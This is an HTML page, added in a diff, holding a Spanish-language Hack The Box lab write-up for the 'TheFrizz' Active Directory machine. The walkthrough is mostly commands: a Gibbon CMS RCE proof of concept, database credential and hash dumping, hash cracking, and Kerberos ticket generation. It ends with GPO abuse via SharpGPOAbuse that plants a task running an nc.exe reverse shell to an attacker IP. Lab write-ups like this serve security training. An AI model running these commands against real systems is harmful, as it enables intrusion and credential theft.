@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | TheFrizz HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/thefrizz/pasted-image-20260223173231.png" alt="TheFrizz HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>TheFrizz</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>Kerberos</span>
+            <span>kubernetes</span>
+            <span>gpo</span>
+            <span>ssh</span>
+            <span>mysql</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: <code>CMS Gibbon</code></li>
+            <li><code>Explotación</code>: <code>RCE</code> sin credenciales</li>
+            <li><code>Movimiento lateral</code>: Acceso a <code>BD</code> y crackeo de hash con salt</li>
+            <li><code>Explotación</code>: <code>Kerberos</code> para el usuario f.frizzle</li>
+            <li><code>Movimiento lateral</code>: Archivo en papelera con credenciales en <code>Base64</code></li>
+            <li><code>Explotación</code>: <code>Kerberos</code> para el usuario M.SchoolBus</li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Group Policy Creator Owners</code> <code>GPO</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260223130441.png" alt="TheFrizz HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: CMS Gibbon v25.0.0 RCE sin Credenciales</h2>
+          <p><a href="https://github.com/byt3loss/CVE-2023-45878_to_RCE" target="_blank" rel="noreferrer">poc.sh</a></p>
+          <div class="code-card">
+            <h3>POC GitHub con el que conseguimos acceso directamente tras su ejecución</h3>
+            <pre><code># Recordad dar permisos chmod +x poc.sh
+bash poc.sh 10.10.16.130 4444 frizzdc.frizz.htb:80</code></pre>
+          </div>
+          <blockquote>RCE Manual: Subir RCE y Ejecutar Payload <a href="https://www.revshells.com/" target="_blank" rel="noreferrer">PowerShell#2</a> URL Encode</blockquote>
+          <p>&lt;div style=&quot;display:flex; gap:20px;&quot;&gt;</p>
+          <p>&lt;img src=&quot;Pasted image 20260223172824.png&quot; width=&quot;350&quot;&gt;</p>
+          <p>&lt;img src=&quot;Pasted image 20260223173013.png&quot; width=&quot;350&quot;&gt;</p>
+          <p>&lt;/div&gt;</p>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260225235109.png" alt="TheFrizz HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: w.webservices -&gt; f.frizzle</h2>
+          <div class="code-card">
+            <h3>Enumerar archivos de configuración del CMS Gibbon</h3>
+            <pre><code>type config.php
+# $databaseUsername = &#x27;MrGibbonsDB&#x27;;
+# $databasePassword = &#x27;MisterGibbs!Parrot!?1&#x27;;
+# $databaseName = &#x27;gibbon&#x27;;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar binarios desde la raíz de la web para localizar la BD que corre en CMS Gibbon</h3>
+            <pre><code>Get-ChildItem C:\xampp\* -Include *.exe -Recurse -ErrorAction SilentlyContinue
+# C:\xampp\mysql\bin\mysql.exe</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar la BD</h3>
+            <pre><code>.\mysql.exe -uMrGibbonsDB -p&#x27;MisterGibbs!Parrot!?1&#x27; gibbon -e &#x27;show tables&#x27;;
+.\mysql.exe -uMrGibbonsDB -p&#x27;MisterGibbs!Parrot!?1&#x27; gibbon -e &#x27;describe gibbonperson&#x27;;
+.\mysql.exe -uMrGibbonsDB -p&#x27;MisterGibbs!Parrot!?1&#x27; gibbon -e &#x27;select username, passwordstrong, passwordstrongsalt from gibbonperson&#x27;;
+
+# username:f.frizzle
+# password:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff7 84242b0b0c03
+# salt:/aACFhikmNopqrRTVz2489</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226001129.png" alt="TheFrizz HTB" />
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226001236.png" alt="TheFrizz HTB" />
+          <div class="code-card">
+            <h3>Crackear hash con Salt</h3>
+            <pre><code># Recomendar formato -&gt; hashcat hash rockyou.txt
+hashcat -m 1420 hash rockyou.txt
+# Credenciales -&gt; f.frizzle:Jenni_Luvs_Magic23</code></pre>
+          </div>
+          <blockquote>Conexión con <code>f.frizzle:Jenni_Luvs_Magic23</code><br /><code>SSH</code>: Permission denied (gssapi-with-mic,keyboard-interactive)<br /><code>SMB</code>: STATUS_NOT_SUPPORTED<br /><code>WinRM</code>: No responde<br />Trataremos de usar <code>Kerberos</code> para conectarnos a través de Kerberos</blockquote>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Kerberos</h2>
+          <div class="code-card">
+            <h3>Modificar /etc/hosts</h3>
+            <pre><code>10.129.232.168 frizzdc.frizz.htb frizz.htb</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Configurar Kerberos: /etc/krb5.conf</h3>
+            <pre><code>[domain_realm]
+    .frizz.htb = FRIZZ.HTB
+    frizz.htb = FRIZZ.HTB
+ 
+[libdefaults]
+    default_realm = FRIZZ.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+    ticket_lifetime = 24h
+    forwardable = true
+ 
+[realms]
+    FRIZZ.HTB = {
+        kdc = FRIZZDC.FRIZZ.HTB
+        admin_server = FRIZZDC.FRIZZ.HTB
+        default_domain = FRIZZ.HTB</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ajustar Reloj</h3>
+            <pre><code>ntpdate 10.129.232.168
+systemctl stop systemd-timesyncd</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Generar Ticket TGT del usuario f.frizzle</h3>
+            <pre><code>impacket-getTGT frizz.htb/&#x27;f.frizzle&#x27;:&#x27;Jenni_Luvs_Magic23&#x27; -dc-ip frizzdc.frizz.htb
+# Exportar Ticket a la variable de entorno  
+export KRB5CCNAME=f.frizzle.ccache  </code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Conexión con la flag -k</h3>
+            <pre><code># Ya podemos acceder a los servicios con la flag -k. Ej SMB
+nxc smb 10.129.232.168 -u &#x27;f.frizzle&#x27; -p &#x27;Jenni_Luvs_Magic23&#x27; -k 
+# Login SSH con ticket Kerberos
+ssh f.frizzle@frizz.htb -k</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Listar papelera</h3>
+            <pre><code>dir -Force # Listar ocultos. 
+# Alternativa: dir /s dir /a 
+tree . /f  # Listar en árbol
+# Alternativa: tree /f /a 
+cd &#x27;.\$RECYCLE.BIN\&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260224002218.png" alt="TheFrizz HTB" />
+          <div class="code-card">
+            <h3>Kali: Transferir Ficheros de Windows a Kali</h3>
+            <pre><code>KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$IE2XMEG.7z&#x27; IE2XMEG.7z
+KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z&#x27; RE2XMEG.7z
+# Descomprimir
+7z x IE2XMEG.7z
+7z x RE2XMEG.7z</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226004447.png" alt="TheFrizz HTB" />
+          <div class="code-card">
+            <h3>Credenciales en fichero de configuración</h3>
+            <pre><code>echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d
+# Password -&gt; !suBcig@MehTed!R
+# Crear lista de usuarios del sistema y hacer PasswordSpray
+# Credenciales -&gt; M.SchoolBus:!suBcig@MehTed!R</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260224005341.png" alt="TheFrizz HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Kerberos</h2>
+          <div class="code-card">
+            <h3>Kerberos</h3>
+            <pre><code># Crear Ticket
+impacket-getTGT frizz.htb/&#x27;M.SchoolBus&#x27;:&#x27;!suBcig@MehTed!R&#x27; -dc-ip frizzdc.frizz.htb  
+# Exportar Ticket
+export KRB5CCNAME=M.SchoolBus.ccache  
+# Login SSH con ticket Kerberos
+ssh M.SchoolBus@frizz.htb -k</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260224010123.png" alt="TheFrizz HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo (GPO) Group Policy Creator Owners</h2>
+          <div class="code-card">
+            <h3>Crear un nuevo GPO malicioso</h3>
+            <pre><code># CMD: Enumerar OU
+dsquery ou -limit 0
+# Crear GPO
+New-GPO -Name Evil-GPO | New-GPLink -Target &quot;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB&quot; -LinkEnabled Yes</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226144053.png" alt="TheFrizz HTB" />
+          <p><a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpGPOAbuse.exe" target="_blank" rel="noreferrer">SharpGPOAbuse.exe</a> + nc.exe</p>
+          <div class="code-card">
+            <h3>Abusar GPO</h3>
+            <pre><code># Payload: Ejecutar nc.exe como Administrator
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;EvilTask&quot; --Author &quot;FRIZZ.HTB\Administrator&quot; --Command &quot;cmd.exe&quot; --Arguments &quot;/c C:\Users\M.SchoolBus\nc.exe 10.10.16.130 443 -e powershell.exe&quot; --GPOName &quot;Evil-GPO&quot; --Force</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226182141.png" alt="TheFrizz HTB" />
+          <div class="code-card">
+            <h3>Forzar que se apliquen las políticas del GPO malicioso mientras montamos un listener</h3>
+            <pre><code>gpupdate /force</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226182425.png" alt="TheFrizz HTB" />
+          <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260226182459.png" alt="TheFrizz HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>Kerberos</span>
+            <span>kubernetes</span>
+            <span>gpo</span>
+            <span>ssh</span>
+            <span>mysql</span>
+            <span>gibbon</span>
+            <span>salt</span>
+            <span>tree</span>
+            <span>dir</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
